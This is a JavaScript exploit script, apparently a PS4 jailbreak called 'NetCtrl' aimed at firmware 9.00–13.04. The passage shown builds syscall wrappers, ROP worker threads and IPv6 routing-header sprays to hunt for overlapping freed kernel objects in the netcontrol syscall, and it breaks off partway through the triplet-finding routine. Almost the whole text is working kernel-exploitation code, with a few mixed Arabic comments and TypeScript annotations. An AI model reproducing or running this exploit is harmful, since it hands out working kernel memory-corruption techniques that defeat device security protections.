// include('userland.js')
/* eslint-disable prefer-rest-params */
if (typeof libc_addr === 'undefined') {
  include('userland.js');
}
include('kernel.js');
include('binloader.js');

/* ===========================
  *   NetCtrl exploit
  * ===========================
  */
// Polyfill for padStart (older JS engines)
if (!String.prototype.padStart) {
  String.prototype.padStart = function padStart(targetLength, padString) {
    targetLength = targetLength >> 0;
    padString = String(padString !== undefined ? padString : ' ');
    if (this.length > targetLength) {
      return String(this);
    }
    targetLength = targetLength - this.length;
    if (targetLength > padString.length) {
      padString += padString.repeat(targetLength / padString.length);
    }
    return padString.slice(0, targetLength) + String(this);
  };
}

/* ===========================
  *   Syscall registrations
  * ===========================
  */

fn.register(0x29, 'dup', ['bigint'], 'bigint');
var dup = fn.dup;
fn.register(0x06, 'close', ['bigint'], 'bigint');
var close = fn.close;
fn.register(0x03, 'read', ['bigint', 'bigint', 'number'], 'bigint');
var read = fn.read;
fn.register(0x04, 'write', ['bigint', 'bigint', 'number'], 'bigint');
var write = fn.write;
fn.register(0x36, 'ioctl', ['bigint', 'number', 'bigint'], 'bigint');
var ioctl = fn.ioctl;
fn.register(0x2A, 'pipe', ['bigint'], 'bigint');
var pipe = fn.pipe;
fn.register(0x16A, 'kqueue', [], 'bigint');
var kqueue = fn.kqueue;
fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint');
var socket = fn.socket;
fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint');
var socketpair = fn.socketpair;
fn.register(0x76, 'getsockopt', ['bigint', 'number', 'number', 'bigint', 'bigint'], 'bigint');
var getsockopt = fn.getsockopt;
fn.register(0x69, 'setsockopt', ['bigint', 'number', 'number', 'bigint', 'number'], 'bigint');
var setsockopt = fn.setsockopt;
fn.register(0x17, 'setuid', ['number'], 'bigint');
var setuid = fn.setuid;
fn.register(20, 'getpid', [], 'bigint');
var getpid = fn.getpid;
fn.register(0x14B, 'sched_yield', [], 'bigint');
var sched_yield = fn.sched_yield;
fn.register(0x1E7, 'cpuset_getaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
var cpuset_getaffinity = fn.cpuset_getaffinity;
fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
var cpuset_setaffinity = fn.cpuset_setaffinity;
fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint');
var rtprio_thread = fn.rtprio_thread;
fn.register(0x63, 'netcontrol', ['bigint', 'number', 'bigint', 'number'], 'bigint');
var netcontrol = fn.netcontrol;
fn.register(0x1C7, 'thr_new', ['bigint', 'number'], 'bigint');
var thr_new = fn.thr_new;
fn.register(0x1B1, 'thr_kill', ['bigint', 'number'], 'bigint');
var thr_kill = fn.thr_kill;
fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint');
var nanosleep = fn.nanosleep;
fn.register(0x5C, 'fcntl', ['bigint', 'number', 'number'], 'bigint');
var fcntl = fn.fcntl;

/* ===========================
  *   ROP wrappers from syscalls.map
  * ===========================
  */

var read_wrapper = syscalls.map.get(0x03);
var write_wrapper = syscalls.map.get(0x04);
var sched_yield_wrapper = syscalls.map.get(0x14b);
var cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8);
var rtprio_thread_wrapper = syscalls.map.get(0x1D2);
var recvmsg_wrapper = syscalls.map.get(0x1B);
var readv_wrapper = syscalls.map.get(0x78);
var writev_wrapper = syscalls.map.get(0x79);
var thr_exit_wrapper = syscalls.map.get(0x1af);
var thr_suspend_ucontext_wrapper = syscalls.map.get(0x278);
var setsockopt_wrapper = syscalls.map.get(0x69);
var getsockopt_wrapper = syscalls.map.get(0x76);

/* ===========================
  *   setjmp / longjmp
  * ===========================
  */

fn.register(libc_addr.add(0x6CA00), 'setjmp', ['bigint'], 'bigint');
var setjmp = fn.setjmp;
var setjmp_addr = libc_addr.add(0x6CA00);
var longjmp_addr = libc_addr.add(0x6CA50);

/* ===========================
  *   Constants
  * ===========================
  */

var BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF);
var KERNEL_PID = 0;
var SYSCORE_AUTHID = new BigInt(0x48000000, 0x00000007);
var FIOSETOWN = 0x8004667C;
var PAGE_SIZE = 0x4000;
var NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
var NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;
var AF_UNIX = 1;
var AF_INET6 = 28;
var SOCK_STREAM = 1;
var IPPROTO_IPV6 = 41;
var SO_SNDBUF = 0x1001;
var SOL_SOCKET = 0xffff;
var IPV6_RTHDR = 51;
var IPV6_RTHDR_TYPE_0 = 0;
var RTP_PRIO_REALTIME = 2;
var UIO_READ = 0;
var UIO_WRITE = 1;
var UIO_SYSSPACE = 1;
var CPU_LEVEL_WHICH = 3;
var CPU_WHICH_TID = 1;
var IOV_SIZE = 0x10;
var CPU_SET_SIZE = 0x10;
var PIPEBUF_SIZE = 0x18;
var MSG_HDR_SIZE = 0x30;
var FILEDESCENT_SIZE = 0x8;
var UCRED_SIZE = 0x168;
var RTHDR_TAG = 0x13370000;
var UIO_IOV_NUM = 0x14;
var MSG_IOV_NUM = 0x17;

/* ===========================
  *   Tunables (stability)
  * ===========================
  */

var IPV6_SOCK_NUM = 96;
var IOV_THREAD_NUM = 8;
var UIO_THREAD_NUM = 8;
var MAIN_LOOP_ITERATIONS = 3;
var TRIPLEFREE_ITERATIONS = 8;
var KQUEUE_ITERATIONS = 10000;
var MAX_ROUNDS_TWIN = 5;
var MAX_ROUNDS_TRIPLET = 200;
var MAIN_CORE = 4;
var MAIN_RTPRIO = 0x100;
var RTP_LOOKUP = 0;
var RTP_SET = 1;
var PRI_REALTIME = 2;
var F_SETFL = 4;
var O_NONBLOCK = 4;
var FW_VERSION = null; // Set in init()
var kernel_offset;

/* ===========================
  *   Global state
  * ===========================
  */

var iov_recvmsg_workers = [];
var uio_readv_workers = [];
var uio_writev_workers = [];
var spray_ipv6_worker;
var twins = new Array(2);
var triplets = new Array(3);
var ipv6_socks = new Array(IPV6_SOCK_NUM);
var spray_rthdr = malloc(UCRED_SIZE);
var spray_rthdr_len = -1;
var leak_rthdr = malloc(UCRED_SIZE);

// Buffers for potential ROP-based spray/read (kept for structure, can be unused safely)
var spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE);
var read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8);
var check_len = malloc(4);
write32(check_len, 8);
var fdt_ofiles = new BigInt(0);
var master_r_pipe_file = new BigInt(0);
var victim_r_pipe_file = new BigInt(0);
var master_r_pipe_data = new BigInt(0);
var victim_r_pipe_data = new BigInt(0);
var master_pipe_buf = malloc(PIPEBUF_SIZE);
var msg = malloc(MSG_HDR_SIZE);
var msgIov = malloc(MSG_IOV_NUM * IOV_SIZE);
var uioIovRead = malloc(UIO_IOV_NUM * IOV_SIZE);
var uioIovWrite = malloc(UIO_IOV_NUM * IOV_SIZE);
var uio_sock = malloc(8);
var iov_sock = malloc(8);
var iov_thread_ready = malloc(8 * IOV_THREAD_NUM);
var iov_thread_done = malloc(8 * IOV_THREAD_NUM);
var iov_signal_buf = malloc(8 * IOV_THREAD_NUM);
var uio_readv_thread_ready = malloc(8 * UIO_THREAD_NUM);
var uio_readv_thread_done = malloc(8 * UIO_THREAD_NUM);
var uio_readv_signal_buf = malloc(8 * UIO_THREAD_NUM);
var uio_writev_thread_ready = malloc(8 * UIO_THREAD_NUM);
var uio_writev_thread_done = malloc(8 * UIO_THREAD_NUM);
var uio_writev_signal_buf = malloc(8 * UIO_THREAD_NUM);
var uio_buf = malloc(0x40); // نفس حجم struct uio 
var spray_ipv6_ready = malloc(8);
var spray_ipv6_done = malloc(8);
var spray_ipv6_signal_buf = malloc(8);
var spray_ipv6_stack = malloc(0x2000);
var uaf_socket;
var uio_sock_0;
var uio_sock_1;
var iov_sock_0;
var iov_sock_1;
var pipe_sock = malloc(8);
var master_pipe = [0, 0];
var victim_pipe = [0, 0];
var masterRpipeFd;
var masterWpipeFd;
var victimRpipeFd;
var victimWpipeFd;
var kq_fdp;
var kl_lock;
var tmp = malloc(PAGE_SIZE);
var saved_fpu_ctrl = 0;
var saved_mxcsr = 0;
function safe(obj, name) {
  if (!obj) {
    log("SAFE-ERROR: missing " + name, true);
    return null;
  }
  return obj;
}
safe(fn, 'fn');
safe(syscalls, 'syscalls');
safe(kernel, 'kernel');
safe(utils, 'utils');
safe(jsmaf, 'jsmaf');

/* ===========================
  *   Worker Creation
  * ===========================
  */

function create_workers() {
  var sock_buf = malloc(8);

  // iov_recvmsg workers
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    var _ready = iov_thread_ready.add(8 * i);
    var _done = iov_thread_done.add(8 * i);
    var _signal_buf = iov_signal_buf.add(8 * i);
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    var _pipe_ = read32(sock_buf);
    var _pipe_2 = read32(sock_buf.add(4));
    var _ret = iov_recvmsg_worker_rop(_ready, new BigInt(_pipe_), _done, _signal_buf);
    var worker = {
      rop: _ret.rop,
      loop_size: _ret.loop_size,
      pipe_0: _pipe_,
      pipe_1: _pipe_2,
      ready: _ready,
      done: _done,
      signal_buf: _signal_buf
    };
    iov_recvmsg_workers[i] = worker;
  }

  // uio_readv workers
  for (var _i = 0; _i < UIO_THREAD_NUM; _i++) {
    var _ready2 = uio_readv_thread_ready.add(8 * _i);
    var _done2 = uio_readv_thread_done.add(8 * _i);
    var _signal_buf2 = uio_readv_signal_buf.add(8 * _i);
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    var _pipe_3 = read32(sock_buf);
    var _pipe_4 = read32(sock_buf.add(4));
    var _ret2 = uio_readv_worker_rop(_ready2, new BigInt(_pipe_3), _done2, _signal_buf2);
    var _worker = {
      rop: _ret2.rop,
      loop_size: _ret2.loop_size,
      pipe_0: _pipe_3,
      pipe_1: _pipe_4,
      ready: _ready2,
      done: _done2,
      signal_buf: _signal_buf2
    };
    uio_readv_workers[_i] = _worker;
  }

  // uio_writev workers
  for (var _i2 = 0; _i2 < UIO_THREAD_NUM; _i2++) {
    var _ready3 = uio_writev_thread_ready.add(8 * _i2);
    var _done3 = uio_writev_thread_done.add(8 * _i2);
    var _signal_buf3 = uio_writev_signal_buf.add(8 * _i2);
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    var _pipe_5 = read32(sock_buf);
    var _pipe_6 = read32(sock_buf.add(4));
    var _ret3 = uio_writev_worker_rop(_ready3, new BigInt(_pipe_5), _done3, _signal_buf3);
    var _worker2 = {
      rop: _ret3.rop,
      loop_size: _ret3.loop_size,
      pipe_0: _pipe_5,
      pipe_1: _pipe_6,
      ready: _ready3,
      done: _done3,
      signal_buf: _signal_buf3
    };
    uio_writev_workers[_i2] = _worker2;
  }

  // spray_ipv6 worker (حتى لو مش هتستخدمه، نخليه مطابق للتوينز)
  var ready = spray_ipv6_ready;
  var done = spray_ipv6_done;
  var signal_buf = spray_ipv6_signal_buf;
  socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
  var pipe_0 = read32(sock_buf);
  var pipe_1 = read32(sock_buf.add(4));
  var ret = ipv6_sock_spray_and_read_rop(ready, new BigInt(pipe_0), done, signal_buf);
  spray_ipv6_worker = {
    rop: ret.rop,
    loop_size: ret.loop_size,
    pipe_0,
    pipe_1,
    ready,
    done,
    signal_buf
  };
}

/* ===========================
  *   Worker Initialization
  * ===========================
  */

function init_workers() {
  init_threading();
  var worker;
  var ret;
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    worker = iov_recvmsg_workers[i];
    ret = spawn_thread(worker.rop, worker.loop_size);
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn iov_recvmsg_workers[' + i + ']');
    }
    var thread_id = Number(ret.and(0xFFFFFFFF));
    worker.thread_id = thread_id;
  }
  for (var _i3 = 0; _i3 < UIO_THREAD_NUM; _i3++) {
    worker = uio_readv_workers[_i3];
    ret = spawn_thread(worker.rop, worker.loop_size);
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn uio_readv_workers[' + _i3 + ']');
    }
    var _thread_id = Number(ret.and(0xFFFFFFFF));
    worker.thread_id = _thread_id;
  }
  for (var _i4 = 0; _i4 < UIO_THREAD_NUM; _i4++) {
    worker = uio_writev_workers[_i4];
    ret = spawn_thread(worker.rop, worker.loop_size);
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn uio_writev_workers[' + _i4 + ']');
    }
    var _thread_id2 = Number(ret.and(0xFFFFFFFF));
    worker.thread_id = _thread_id2;
  }
}

/* ===========================
  *   Worker Trigger / Wait
  * ===========================
  */

function trigger_iov_recvmsg() {
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    write64(iov_recvmsg_workers[i].done, 0);
  }
  for (var _i5 = 0; _i5 < IOV_THREAD_NUM; _i5++) {
    var worker = iov_recvmsg_workers[_i5];
    var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
    if (ret.eq(BigInt_Error)) {
      throw new Error("Could not signal 'run' iov_recvmsg_workers[".concat(_i5, "]"));
    }
  }
}
function wait_iov_recvmsg() {
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    var ok = wait_for(iov_recvmsg_workers[i].done, new BigInt(1), 'wait_iov_recvmsg[' + i + ']');
    if (!ok) {
      throw new Error('wait_iov_recvmsg timeout at worker ' + i);
    }
  }
}
function trigger_uio_readv() {
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    write64(uio_readv_workers[i].done, 0);
  }
  for (var _i6 = 0; _i6 < UIO_THREAD_NUM; _i6++) {
    var worker = uio_readv_workers[_i6];
    var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
    if (ret.eq(BigInt_Error)) {
      throw new Error("Could not signal 'run' uio_readv_workers[".concat(_i6, "]"));
    }
  }
}
function wait_uio_readv() {
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    var ok = wait_for(uio_readv_workers[i].done, new BigInt(1), 'wait_uio_readv[' + i + ']');
    if (!ok) {
      throw new Error('wait_uio_readv timeout at worker ' + i);
    }
  }
}
function trigger_uio_writev() {
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    write64(uio_writev_workers[i].done, 0);
  }
  for (var _i7 = 0; _i7 < UIO_THREAD_NUM; _i7++) {
    var worker = uio_writev_workers[_i7];
    var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
    if (ret.eq(BigInt_Error)) {
      throw new Error("Could not signal 'run' uio_writev_workers[".concat(_i7, "]"));
    }
  }
}
function wait_uio_writev() {
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    var ok = wait_for(uio_writev_workers[i].done, new BigInt(1), 'wait_uio_writev[' + i + ']');
    if (!ok) {
      throw new Error('wait_uio_writev timeout at worker ' + i);
    }
  }
}
function trigger_ipv6_spray_and_read() {
  write64(spray_ipv6_worker.done, 0);
  var ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack);
  if (ret.eq(BigInt_Error)) {
    throw new Error('Could not spawn spray_ipv6_worker');
  }
  spray_ipv6_worker.thread_id = Number(ret.and(0xFFFFFFFF));
  var w = write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1);
  if (w.eq(BigInt_Error)) {
    throw new Error("Could not signal 'run' spray_ipv6_worker");
  }
}
function wait_ipv6_spray_and_read() {
  wait_for(spray_ipv6_worker.done, new BigInt(1));
}
/* ===========================
  *   Helpers
  * ===========================
  */

function init_threading() {
  var jmpbuf = malloc(0x60);
  setjmp(jmpbuf);
  saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)));
  saved_mxcsr = Number(read32(jmpbuf.add(0x44)));
}
function build_rthdr(buf, size) {
  var len = (size >> 3) - 1 & ~1;
  var actual_size = len + 1 << 3;
  write8(buf.add(0x00), 0); // ip6r_nxt
  write8(buf.add(0x01), len); // ip6r_len
  write8(buf.add(0x02), IPV6_RTHDR_TYPE_0);
  write8(buf.add(0x03), len >> 1); // ip6r_segleft
  return actual_size;
}
function set_sockopt(sd, level, optname, optval, optlen) {
  var result = setsockopt(sd, level, optname, optval, optlen);
  if (result.eq(BigInt_Error)) {
    log('[SOCKOPT] set_sockopt failed: ' + hex(result));
    return BigInt_Error;
  }
  return result;
}
function safe_set_sockopt(sd, level, optname, optval, optlen) {
  if (!sd || sd.eq(BigInt_Error)) {
    log('[SOCKOPT] invalid socket');
    return BigInt_Error;
  }
  if (level === IPPROTO_IPV6 && optname === IPV6_RTHDR && optlen === 0) {
    // allow clearing rthdr
  } else {
    if (!optval || optlen <= 0) {
      log('[SOCKOPT] invalid optval/optlen');
      return BigInt_Error;
    }
  }
  var result = setsockopt(sd, level, optname, optval, optlen);
  if (result.eq(BigInt_Error)) {
    log('[SOCKOPT] failed: ' + hex(result));
  }
  return result;
}
// SO_SNDBUF raw helper – للسوكيتات بس
function set_sndbuf_raw(sd, size) {
  write32(sockopt_val_buf, size);
  var r = setsockopt(sd, SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
  if (r.eq(BigInt_Error)) {
    log('[SO_SNDBUF] failed: ' + hex(r));
  }
  return r;
}
var sockopt_len_ptr = malloc(4);
var nanosleep_timespec = malloc(0x10);
var cpu_mask_buf = malloc(0x10);
var rtprio_scratch = malloc(0x4);
var sockopt_val_buf = malloc(4);
var nc_set_buf = malloc(8);
var nc_clear_buf = malloc(8);
var spawn_thr_args = malloc(0x80);
var spawn_tid = malloc(0x8);
var spawn_cpid = malloc(0x8);
function get_sockopt(sd, level, optname, optval, optlen) {
  write32(sockopt_len_ptr, optlen);
  var result = getsockopt(sd, level, optname, optval, sockopt_len_ptr);
  if (result.eq(BigInt_Error)) {
    throw new Error('get_sockopt error: ' + hex(result));
  }
  return read32(sockopt_len_ptr);
}

// rthdr helpers – دي اللي تشتغل مع IPV6_RTHDR
function set_rthdr(sd, buf, len) {
  return safe_set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}
function get_rthdr(sd, buf, max_len) {
  return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
}
function free_rthdrs(sds) {
  for (var sd of sds) {
    if (!sd || sd.eq(BigInt_Error) || sd.eq(new BigInt(0))) {
      continue;
    }
    // مسح IPV6_RTHDR
    safe_set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0);
  }
}
function free_rthdr(sd) {
  safe_set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0);
}
function pin_to_core(core) {
  write32(cpu_mask_buf, 1 << core);
  cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, BigInt_Error, CPU_SET_SIZE, cpu_mask_buf);
}
function get_core_index(mask_addr) {
  var num = Number(read32(mask_addr));
  var position = 0;
  while (num > 0) {
    num = num >>> 1;
    position++;
  }
  return position - 1;
}
function get_current_core() {
  cpuset_getaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, BigInt_Error, CPU_SET_SIZE, cpu_mask_buf);
  return get_core_index(cpu_mask_buf);
}
function set_rtprio(prio) {
  write16(rtprio_scratch, PRI_REALTIME);
  write16(rtprio_scratch.add(2), prio);
  rtprio_thread(RTP_SET, 0, rtprio_scratch);
}
function get_rtprio() {
  write16(rtprio_scratch, PRI_REALTIME);
  write16(rtprio_scratch.add(2), 0);
  rtprio_thread(RTP_LOOKUP, 0, rtprio_scratch);
  return Number(read16(rtprio_scratch.add(2)));
}
function fill_buffer_64(addr, value, size) {
  for (var i = 0; i < size; i += 8) {
    write64(addr.add(i), value);
  }
}

/* ===========================
 *   wait_for helper
 * =========================== 
 */

function nanosleep_fun(nsec) {
  write64(nanosleep_timespec, Math.floor(nsec / 1e9)); // tv_sec
  write64(nanosleep_timespec.add(8), nsec % 1e9);      // tv_nsec
  nanosleep(nanosleep_timespec);
}

// باتش: إضافة timeout + label للتشخيص
function wait_for(addr, threshold, label) {
  var target = (typeof threshold === "object") ? threshold : new BigInt(threshold);
  var start  = Date.now();
  var maxMs  = 5000; // 5 ثواني لكل انتظار – تقدر تزود/تقلل

  while (!read64(addr).eq(target)) {
    nanosleep_fun(1e6); // 1ms بدل 1ns عشان ما يبقاش busy loop
    if (Date.now() - start > maxMs) {
      log('[WAIT] timeout at ' + (label || 'unknown') + ' addr=' + hex(addr));
      return false;
    }
  }
  return true;
}
/* ===========================
  *   Initialization (init)
  * ===========================
  */

function init() {
  setup_log_screen();
  log('====mz==== PS4 Magic NetCtrl Jailbreak ====mz====');
  log('                          By ELHOUT');
  log('build: stable-clean (no crash)');
  FW_VERSION = get_fwversion();
  log('PS4 Firmware = ' + FW_VERSION);
  if (FW_VERSION === null) {
    log('Failed to detect PS4 firmware version. Aborting...');
    send_notification('Failed to detect PS4 firmware version.\nAborting...');
    return false;
  }
  var compare_version = (a, b) => {
    var aa = a.split('.');
    var bb = b.split('.');
    var amaj = Number(aa[0]);
    var amin = Number(aa[1]);
    var bmaj = Number(bb[0]);
    var bmin = Number(bb[1]);
    return amaj === bmaj ? amin - bmin : amaj - bmaj;
  };
  if (compare_version(FW_VERSION, '9.00') < 0 || compare_version(FW_VERSION, '13.04') > 0) {
    log('Unsupported PS4 firmware (Supported: 9.00–13.04). Aborting...');
    send_notification('Unsupported PS4 firmware\nAborting...');
    return false;
  }
  kernel_offset = get_kernel_offset(FW_VERSION);
  log('Kernel offsets : loaded for FW ' + FW_VERSION);
  return true;
}

/* ===========================
  *   Setup
  * ===========================
  */
// fallback logger to avoid "used before defined" + no-redeclare
// eslint-disable-next-line @typescript-eslint/no-explicit-any
let _log: any = function (msg: any) {
  try { ws.broadcast(msg); } catch (e) {}
};
var prev_core = -1;
var prev_rtprio = -1;
var cleanup_called = false;
function setup() {
  log('Preparing netctrl...');
  prev_core = get_current_core();
  prev_rtprio = get_rtprio();
  pin_to_core(MAIN_CORE);
  set_rtprio(MAIN_RTPRIO);
  log('Pinned to core ' + MAIN_CORE + ' (previous: ' + prev_core + ')');

  // Prepare spray buffer
  spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);

  // Pre-fill ROP spray buffer
  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
    build_rthdr(spray_rthdr_rop.add(i * UCRED_SIZE), UCRED_SIZE);
    write32(spray_rthdr_rop.add(i * UCRED_SIZE + 0x04), RTHDR_TAG | i);
  }

  // Prepare msg iov
  write64(msg.add(0x10), msgIov);
  write64(msg.add(0x18), MSG_IOV_NUM);
  var dummyBuffer = malloc(0x1000);
  fill_buffer_64(dummyBuffer, new BigInt(0x41414141, 0x41414141), 0x1000);
  write64(uioIovRead.add(0x00), dummyBuffer);
  write64(uioIovWrite.add(0x00), dummyBuffer);

  // Create socket pair for uio spraying
  socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sock);
  uio_sock_0 = read32(uio_sock);
  uio_sock_1 = read32(uio_sock.add(4));

  // Create socket pair for iov spraying
  socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sock);
  iov_sock_0 = read32(iov_sock);
  iov_sock_1 = read32(iov_sock.add(4));

  // Create ipv6 sockets
  for (var j = 0; j < ipv6_socks.length; j++) {
    var s = socket(AF_INET6, SOCK_STREAM, 0);
    if (!s || s.eq(BigInt_Error)) {
      log('[SETUP] Failed to create ipv6 socket at index ' + j);
      ipv6_socks[j] = new BigInt(0); // قيمة آمنة
    } else {
      ipv6_socks[j] = s;
    }
  }

  // Initialize pktopts (يمسح أي rthdr قديم بأمان)
  free_rthdrs(ipv6_socks);

  // Create pipes
  pipe(pipe_sock);
  master_pipe[0] = read32(pipe_sock);
  master_pipe[1] = read32(pipe_sock.add(4));
  pipe(pipe_sock);
  victim_pipe[0] = read32(pipe_sock);
  victim_pipe[1] = read32(pipe_sock.add(4));
  masterRpipeFd = master_pipe[0];
  masterWpipeFd = master_pipe[1];
  victimRpipeFd = victim_pipe[0];
  victimWpipeFd = victim_pipe[1];
  fcntl(new BigInt(masterRpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(masterWpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(victimRpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(victimWpipeFd), F_SETFL, O_NONBLOCK);

  // Create workers
  create_workers();
  init_workers();
  log("Spawned workers iov[".concat(IOV_THREAD_NUM, "] uio_readv[").concat(UIO_THREAD_NUM, "] uio_writev[").concat(UIO_THREAD_NUM, "]"));
}

/* ===========================
  *   Cleanup
  * ===========================
  */

function cleanup() {
  var kill_workers = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : false;
  if (cleanup_called) return;
  cleanup_called = true;
  log('Cleaning up...');

  // Close ipv6 sockets (مع حراسة بسيطة)
  for (var i = 0; i < ipv6_socks.length; i++) {
    var sd = ipv6_socks[i];
    if (sd && sd.eq && !sd.eq(BigInt_Error) && !sd.eq(new BigInt(0))) {
      close(sd);
    }
  }

  // Kill iov_recvmsg workers
  for (var worker of iov_recvmsg_workers) {
    if (!worker) continue;
    if (worker.pipe_1 !== undefined && worker.signal_buf) {
      write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
    }
    if (kill_workers && worker.thread_id !== undefined) {
      thr_kill(worker.thread_id, 9);
    }
  }

  // Kill uio_readv workers
  for (var _worker3 of uio_readv_workers) {
    if (!_worker3) continue;
    if (_worker3.pipe_1 !== undefined && _worker3.signal_buf) {
      write(new BigInt(_worker3.pipe_1), _worker3.signal_buf, 1);
    }
    if (kill_workers && _worker3.thread_id !== undefined) {
      thr_kill(_worker3.thread_id, 9);
    }
  }

  // Kill uio_writev workers
  for (var _worker4 of uio_writev_workers) {
    if (!_worker4) continue;
    if (_worker4.pipe_1 !== undefined && _worker4.signal_buf) {
      write(new BigInt(_worker4.pipe_1), _worker4.signal_buf, 1);
    }
    if (kill_workers && _worker4.thread_id !== undefined) {
      thr_kill(_worker4.thread_id, 9);
    }
  }

  // spray_ipv6_worker
  if (spray_ipv6_worker && spray_ipv6_worker.pipe_1 !== undefined && spray_ipv6_worker.signal_buf) {
    write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1);
  }
  if (kill_workers && spray_ipv6_worker && spray_ipv6_worker.thread_id !== undefined) {
    thr_kill(spray_ipv6_worker.thread_id, 9);
  }

  // Close main sockets (مع حراسة بسيطة)
  if (uio_sock_1) close(new BigInt(uio_sock_1));
  if (uio_sock_0) close(new BigInt(uio_sock_0));
  if (iov_sock_1) close(new BigInt(iov_sock_1));
  if (iov_sock_0) close(new BigInt(iov_sock_0));

  // Restore core + priority
  if (prev_core >= 0) {
    pin_to_core(prev_core);
    prev_core = -1;
  }
  set_rtprio(prev_rtprio);
  log('Cleanup completed');
}

/* ===========================
  *   Logging Screen
  * ===========================
  */

var LOG_MAX_LINES = 38;
var LOG_COLORS = ['#FF6B6B', '#FFA94D', '#FFD93D', '#6BCF7F', '#4DABF7', '#9775FA', '#DA77F2'];

function setup_log_screen() {
  jsmaf.root.children.length = 0;
  var bg = new Image({
    url: 'file:///../download0/img/multiview_bg_VAF.png',
    x: 0,
    y: 0,
    width: 1920,
    height: 1080
  });
  jsmaf.root.children.push(bg);

  for (var i = 0; i < LOG_COLORS.length; i++) {
    new Style({
      name: 'log' + i,
      color: LOG_COLORS[i],
      size: 20
    });
  }

  var logLines: any[] = [];
  var logBuf: string[] = [];

  for (var _i10 = 0; _i10 < LOG_MAX_LINES; _i10++) {
    var line = new jsmaf.Text();
    line.text = '';
    line.style = 'log' + _i10 % LOG_COLORS.length;
    line.x = 20;
    line.y = 120 + _i10 * 20;
    jsmaf.root.children.push(line);
    logLines.push(line);
  }

  _log = function (msg: string, screen?: boolean) {
    if (screen) {
      logBuf.push(msg);
      if (logBuf.length > LOG_MAX_LINES) logBuf.shift();
      for (let i = 0; i < LOG_MAX_LINES; i++) {
        logLines[i].text = i < logBuf.length ? logBuf[i] : '';
      }
    }
    ws.broadcast(msg);
  };
}
/* ===========================
  *   Twins Finder
  * ===========================
  */

function find_twins() {
  var count = 0;
  var val;
  var i;
  var j;
  var zeroMemoryCount = 0;
  var spray_add = spray_rthdr.add(0x04);
  var leak_add = leak_rthdr.add(0x04);
  while (count < MAX_ROUNDS_TWIN) {
    if (safe_memory_available() === 0) {
      zeroMemoryCount++;
      if (zeroMemoryCount >= 5) {
        log('netctrl failed!');
        cleanup();
        return false;
      }
    } else {
      zeroMemoryCount = 0;
    }
    for (i = 0; i < ipv6_socks.length; i++) {
      write32(spray_add, RTHDR_TAG | i);
      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
    }
    for (i = 0; i < ipv6_socks.length; i++) {
      get_rthdr(ipv6_socks[i], leak_rthdr, 8);
      val = read32(leak_add);
      j = val & 0xFFFF;
      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
        twins[0] = i;
        twins[1] = j;
        log('Twins found: [' + i + '] [' + j + ']');
        return true;
      }
    }
    count++;
  }
  log('find_twins failed');
  return false;
}
function find_triplet(master, other) {
  var iterations = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : MAX_ROUNDS_TRIPLET;
  var count = 0;
  var val;
  var i;
  var j;
  var spray_add = spray_rthdr.add(0x04);
  var leak_add = leak_rthdr.add(0x04);
  while (count < iterations) {
    for (i = 0; i < ipv6_socks.length; i++) {
      if (i === master || i === other) {
        continue;
      }
      write32(spray_add, RTHDR_TAG | i);
      var sd = ipv6_socks[i];
      if (!sd || sd.eq(BigInt_Error) || sd.eq(new BigInt(0))) {
        continue;
      }
      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
    }
